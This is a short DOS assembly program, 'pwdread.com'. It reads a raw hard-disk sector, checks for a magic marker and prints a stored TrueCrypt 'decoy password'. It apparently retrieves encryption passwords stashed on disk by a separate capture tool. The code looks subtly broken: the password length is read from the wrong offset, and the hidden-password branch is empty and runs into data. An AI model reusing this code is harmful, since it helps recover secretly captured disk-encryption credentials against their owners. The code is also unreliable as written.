; pwdread.com
%define		PURPLE_ID		0xc001c0de


org 100h

	mov		ax, cs
	mov		ds, ax
	mov		es, ax

	; read purple sector into buffer
	mov 	ax, 0201h
	mov		bx, buffer
	mov 	cx, 32
	mov		dx, 80h
	int 	13h
	
	cmp		dword [buffer], PURPLE_ID
	je		ishere

endme:	
	mov		ax, 4c00h
	int 	21h
	
ishere:
	xor		bx, bx
	mov		bl, [buffer+8]
	or		bl, bl
	jz		.next
	
	mov		byte [tc_decoy_password + bx], '$'
	mov		ah, 09h
	mov		dx, tc_decoy_password
	int		21h
	jmp 	endme
	
.next:
	
buffer:	
id	dd 0
tc_decoy_password_len	db	 0
tc_decoy_password		resb 65
tc_hidden_password_len  db 0
tc_hidden_password		resb 65
resb 512

	